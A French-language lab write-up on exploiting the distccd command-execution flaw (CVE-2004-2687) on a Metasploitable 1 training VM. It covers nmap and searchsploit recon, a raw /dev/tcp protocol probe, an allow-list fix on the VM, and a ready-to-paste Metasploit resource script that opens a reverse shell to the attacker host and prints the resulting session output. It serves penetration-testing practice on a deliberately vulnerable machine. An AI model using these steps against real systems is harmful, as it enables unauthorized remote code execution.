# Write-up — DistCC Daemon RCE (Metasploitable 1, port 3632)

Cible : `172.28.128.4` · CVE-2004-2687 · Résultat : shell `daemon`.

Tout ce qui suit est copier-coller direct (testé en zsh). Deux environnements distincts :
**🖥 Kali** (ton terminal) et **📦 VM** (console Metasploitable1, login `msfadmin`/`msfadmin`).

---

## 1. Recon

🖥 Kali :
```bash
nmap -sC -sV -p 3632 172.28.128.4
nmap -p 3632 --script distcc-cve2004-2687 172.28.128.4
```
Le script NSE ne confirme rien de concluant par lui-même — juste `3632/tcp open distccd?`.

## 2. Identifier la vulnérabilité

🖥 Kali :
```bash
searchsploit distcc
```
```
DistCC Daemon - Command Execution (Metasploit) | multiple/remote/9915.rb
```
Confirme qu'un exploit existe, mais ne donne ni CVE ni chemin de module Metasploit
utilisable. Recherche dans `msfconsole` pour trouver ce chemin :

```bash
msfconsole -q -x "search distcc; exit"
```
```
#  Full Name                      Disclosure Date  Rank       Check  Name
-  ---------                      ---------------  ----       -----  ----
0  exploit/unix/misc/distcc_exec  2002-02-01       excellent  Yes    DistCC Daemon Command Execution
```
Un seul résultat : `exploit/unix/misc/distcc_exec`. Reste à obtenir la CVE :

```bash
msfconsole -q -x "info exploit/unix/misc/distcc_exec; exit"
```
La CVE (`CVE-2004-2687`) est dans la sortie `info`, section `References`.

`distccd` exécute toute commande de compilation reçue **sans authentification** ; seul
garde-fou : une whitelist IP (`--allow`) fixée au démarrage du démon.

## 3. Sonder le protocole à la main

Format du protocole (tokens `NOM` + longueur hex 8 chiffres + données), trouvé en lisant le
source du script nmap `distcc-cve2004-2687.nse`. `DIST00000001` = handshake minimal
(annonce de version de protocole), suffisant pour tester l'accessibilité sans construire un
payload complet.

🖥 Kali :
```bash
timeout 10 bash -c 'exec 3<>/dev/tcp/172.28.128.4/3632 && echo CONNECTED && printf "DIST00000001" >&3 && timeout 2 cat <&3 | xxd | head -5'
```
*(`/dev/tcp` est bash-only ; en zsh pur, utiliser plutôt : `printf "DIST00000001" | nc -w 2 172.28.128.4 3632 | xxd | head -5`)*

**Si ça affiche `CONNECTED` puis rien d'autre (timeout propre) → ACL déjà OK, passe à
l'étape 5.**
**Si ça affiche `CONNECTED` puis `Connexion ré-initialisée par le correspondant` → ACL à
corriger, étape 4.**

## 4. Corriger l'ACL distcc (si RST à l'étape 3)

Le build par défaut autorise seulement `192.168.0.0/16`, `10.0.0.0/8`, `172.16.0.0/16` —
notre `172.28.128.0/24` n'y est pas.

📦 VM (console) :
```bash
sudo sed -i 's#--allow 172.16.0.0/16#--allow 172.16.0.0/16 --allow 172.28.128.0/24#' /etc/init.d/distcc
sudo pkill -9 distccd
sudo /etc/init.d/distcc start
```
⚠️ `/etc/init.d/distcc restart`/`stop` sont des no-op volontaires dans ce build (`echo
"hah!"` / `"not implemented"`) — ne pas les utiliser, toujours `pkill` + `start`. Et
`/etc/default/distcc` (`ALLOWEDNETS=`) n'est **pas lu** malgré son nom — la vraie liste est
codée en dur dans `/etc/init.d/distcc`.

Revérifier depuis Kali avec la commande de l'étape 3 : doit maintenant timeout proprement
(plus de RST).

## 5. Exploiter

🖥 Kali — via un resource script (forme réellement testée, évite tout souci de guillemets
imbriqués dans une longue chaîne `-x`) :
```bash
cat > /tmp/distcc.rc << 'EOF'
use exploit/unix/misc/distcc_exec
set RHOSTS 172.28.128.4
set PAYLOAD cmd/unix/reverse
set LHOST 172.28.128.1
set LPORT 4445
exploit -z
sessions -l
sessions -i 1 -c id
sessions -i 1 -c whoami
sessions -i 1 -c "uname -a"
sessions -K
exit -y
EOF
msfconsole -q -r /tmp/distcc.rc
```

Résultat attendu :
```
[+] 172.28.128.4:3632 - Backdoor service has been spawned, handling...
[*] Command shell session 1 opened (172.28.128.1:4445 -> 172.28.128.4:xxxxx)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
daemon
Linux metasploitable 2.6.24-16-server ...
```

⚠️ Piège vécu ici une première fois : des guillemets imbriqués mal fermés dans une commande
`-x` trop longue (`-c 'id; whoami; ...'` avec un seul bloc de guillemets) cassent le parsing
`msfconsole` — les commandes suivantes s'exécutent alors **localement sur Kali** au lieu de
la session distante (préfixe `[*] exec:` dans la sortie = exécution locale, pas sur la
cible). Garder les `sessions -i 1 -c ...` sur des lignes séparées comme ci-dessus évite le
problème. Et `-c` doit être en minuscule (`-C` n'est pas reconnu et casse aussi le parsing).

`exploit -z` est indispensable en mode non-interactif (`-x`/`-r`) : sans lui, `msfconsole`
bascule automatiquement dans le shell distant dès qu'une session s'ouvre et bloque le
script.

---

**Pour rejouer tout le scénario depuis zéro** : `./start.sh` (démarre la VM), étape 1 → 5
dans l'ordre. L'ACL (étape 4) ne doit être corrigée qu'une fois — elle persiste entre
redémarrages (modif sur disque, `/etc/init.d/distcc`).

**Suite du parcours MS1 :** Tomcat (port 8180), `tomcat:tomcat`.
